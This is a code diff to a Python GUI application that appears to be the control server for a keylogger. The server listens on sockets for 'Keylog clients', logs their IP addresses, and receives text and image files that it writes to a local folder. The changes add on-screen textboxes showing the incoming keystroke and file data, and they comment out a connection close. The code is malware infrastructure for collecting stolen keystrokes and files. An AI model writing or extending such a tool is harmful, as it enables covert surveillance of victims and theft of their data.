@@ -104,6 +104,7 @@ class App(customtkinter.CTk):
                 # Continue
                 s.bind((HOST, PORT))
                 print("KEYLOGGER: Listening for Keylog clients.")
+                self.textbox.insert("0.0", "KEYLOGGER TEXT INFO\n")
                 s.listen()
                 conn, addr = s.accept()
                 self.CLIENT_IP.append(addr)
@@ -153,7 +154,14 @@ class App(customtkinter.CTk):
         def create_file_transfer_socket():
             HOST = "127.0.0.4"
             PORT = 1930
+
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                # Make a top Level progress bar  
+                textbox = customtkinter.CTkTextbox(self, width=550, height=330)
+                textbox.grid(row=0, column=2)
+                textbox.insert("0.0", "FILE TRANSFER BYTE INFO")
+
+                # Create the Socket
                 s.bind((HOST, PORT))
                 s.listen()
                 self.SERVER_SOCKETS.append(s)
@@ -178,17 +186,20 @@ class App(customtkinter.CTk):
                                 case "FILENAME_TEXT":
                                     print(f"\nCreated TXT file: {msg}")
                                     new_file = open(f"Files/{data}", "w")
+                                    textbox.insert("0.0", f"{msg}")
                                     msg = ""
 
                                 case "FILENAME_IMG":
                                     print(f"\nCreated IMG file: {msg}")
                                     new_file = open(f"Files/{data}", "wb")
+                                    textbox.insert("0.0", f"{msg}")
                                     msg = ""
 
                                 case "TXT_DATA":
                                     print(data)
                                     print(f"\nWriting to TXT file: {msg}")
                                     new_file.write(data)
+                                    textbox.insert("0.0", f"{data}")
                                     msg = ""
 
                                 case "IMG_DATA":
@@ -197,6 +208,7 @@ class App(customtkinter.CTk):
                                     data = data.encode("utf-8")
                                     if data.isspace() == False:
                                         new_file.write(data)
+                                        textbox.insert("0.0", f"{data}")
                                     msg = ""
                                 
                                 case "FINISH":
@@ -206,7 +218,7 @@ class App(customtkinter.CTk):
                                 
                                 case "CLOSE":
                                     print(f"\nAt the end of the socket: {msg}")
-                                    conn.close()
+                                    #conn.close()
                                     msg = ""
                                     #break
          
